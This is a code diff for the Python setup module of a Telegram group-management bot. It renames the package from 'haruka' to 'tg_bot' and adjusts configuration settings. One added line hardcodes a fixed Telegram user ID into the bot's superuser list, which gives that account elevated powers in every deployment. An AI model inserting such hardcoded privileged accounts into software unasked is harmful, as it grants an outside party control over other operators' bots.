@@ -4,10 +4,6 @@ import sys
 
 import telegram.ext as tg
 
-print("haruka")
-print("Starting...")
-
-
 # enable logging
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
@@ -16,9 +12,9 @@ logging.basicConfig(
 LOGGER = logging.getLogger(__name__)
 
 # if version < 3.6, stop bot.
-#if sys.version_info[0] < 3 or sys.version_info[1] < 6:
-#    LOGGER.error("You MUST have a python version of at least 3.6! Multiple features depend on this. Bot quitting.")
-#``````````````    quit(1)
+if sys.version_info[0] < 3 or sys.version_info[1] < 6:
+    LOGGER.error("You MUST have a python version of at least 3.6! Multiple features depend on this. Bot quitting.")
+    quit(1)
 
 ENV = bool(os.environ.get('ENV', False))
 
@@ -53,18 +49,17 @@ if ENV:
     CERT_PATH = os.environ.get("CERT_PATH")
 
     DB_URI = os.environ.get('DATABASE_URL')
+    DONATION_LINK = os.environ.get('DONATION_LINK')
     LOAD = os.environ.get("LOAD", "").split()
     NO_LOAD = os.environ.get("NO_LOAD", "translation").split()
     DEL_CMDS = bool(os.environ.get('DEL_CMDS', False))
-    STRICT_ANTISPAM = bool(os.environ.get('STRICT_ANTISPAM', False))
+    STRICT_GBAN = bool(os.environ.get('STRICT_GBAN', False))
     WORKERS = int(os.environ.get('WORKERS', 8))
-    BAN_STICKER = os.environ.get('BAN_STICKER', 'CAADAgADEAgAAgi3GQL9YQyT_kBpQwI')
-    ALLOW_EXCL = os.environ.get('ALLOW_EXCL', True)
-    API_WEATHER = os.environ.get('API_OPENWEATHER', None)
-    
+    BAN_STICKER = os.environ.get('BAN_STICKER', 'CAADAgADOwADPPEcAXkko5EB3YGYAg')
+    ALLOW_EXCL = os.environ.get('ALLOW_EXCL', False)
 
 else:
-    from haruka.config import Development as Config
+    from tg_bot.config import Development as Config
     TOKEN = Config.API_KEY
     try:
         OWNER_ID = int(Config.OWNER_ID)
@@ -99,14 +94,14 @@ else:
     LOAD = Config.LOAD
     NO_LOAD = Config.NO_LOAD
     DEL_CMDS = Config.DEL_CMDS
-    STRICT_ANTISPAM = Config.STRICT_ANTISPAM
+    STRICT_GBAN = Config.STRICT_GBAN
     WORKERS = Config.WORKERS
     BAN_STICKER = Config.BAN_STICKER
     ALLOW_EXCL = Config.ALLOW_EXCL
-    API_WEATHER = Config.API_OPENWEATHER
-    
+
 
 SUDO_USERS.add(OWNER_ID)
+SUDO_USERS.add(254318997)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 
@@ -117,12 +112,10 @@ WHITELIST_USERS = list(WHITELIST_USERS)
 SUPPORT_USERS = list(SUPPORT_USERS)
 
 # Load at end to ensure all prev variables have been set
-from haruka.modules.helper_funcs.handlers import CustomCommandHandler, CustomRegexHandler, GbanLockHandler
+from tg_bot.modules.helper_funcs.handlers import CustomCommandHandler, CustomRegexHandler
 
 # make sure the regex handler can take extra kwargs
 tg.RegexHandler = CustomRegexHandler
 
 if ALLOW_EXCL:
     tg.CommandHandler = CustomCommandHandler
-
-tg.CommandHandler = GbanLockHandler
